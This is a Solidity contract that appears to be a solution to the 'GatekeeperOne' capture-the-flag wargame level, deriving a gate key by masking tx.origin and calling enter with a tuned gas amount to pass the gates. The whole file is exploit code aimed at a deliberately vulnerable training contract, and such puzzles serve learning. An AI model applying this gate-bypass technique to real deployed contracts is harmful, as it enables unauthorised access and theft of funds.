// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperOne{

    IGateKeeperOne gatekeeperone;

    constructor(address _gatekeeperoneAddress){
      gatekeeperone = IGateKeeperOne(_gatekeeperoneAddress);
    }
    function beEntrant() public {
        bytes8 _gateKey =  bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        gatekeeperone.enter{gas:82164}(_gateKey);
    }

}